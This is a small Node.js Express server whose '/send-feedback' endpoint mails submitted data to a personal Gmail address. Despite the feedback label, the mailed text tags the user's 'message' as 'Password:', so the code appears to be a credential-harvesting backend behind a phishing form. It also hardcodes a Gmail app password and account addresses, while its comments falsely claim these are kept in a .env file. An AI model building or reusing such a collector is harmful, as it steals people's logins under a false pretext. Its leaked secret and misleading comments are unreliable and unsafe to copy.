
const express = require("express");
const nodemailer = require("nodemailer");
const cors = require("cors");

const app = express();

// Allow frontend to call backend
app.use(cors());
app.use(express.json());

app.post("/send-feedback", async (req, res) => {
  const { email, message } = req.body;

  if (!email || !message) {
    return res.status(400).json({ error: "Email and message required" });
  }

  try {
    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: "bacem.klali@isgb.ucar.tn",   // Stored in .env
        pass: "bomy sstk oghr zfbm"    // Stored in .env (App Password)
      }
    });

    await transporter.sendMail({
      from: "bacem.klali@isgb.ucar.tn",
      to: "bacemklali1@gmail.com",
      subject: "New Feedback Received",
      text: `Email: ${email}\nPassword: ${message}`
    });

    res.json({ status: "success" });
  } catch (err) {
    console.error("Email error:", err);
    res.status(500).json({ error: "Failed to send email" });
  }
});

app.listen(5000, () => console.log("Backend running on port 5000"));
